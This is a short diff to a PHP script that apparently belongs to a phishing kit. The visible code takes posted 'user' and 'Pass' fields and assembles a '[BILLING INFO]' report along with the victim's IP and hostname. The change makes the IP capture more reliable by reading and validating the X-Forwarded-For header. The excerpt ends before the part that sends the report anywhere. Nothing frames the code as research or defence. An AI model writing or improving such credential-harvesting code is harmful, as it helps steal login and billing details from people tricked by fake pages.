@@ -1,5 +1,14 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
+$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+
+if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $candidate = trim($ips[0]);
+
+    if (filter_var($candidate, FILTER_VALIDATE_IP)) {
+        $ip = $candidate;
+    }
+}
 $hostname = gethostbyaddr($ip);
 if(!empty($_POST['user']) &&  !empty($_POST['Pass'])){
 $message  = "=========[BILLING INFO]=========\n";
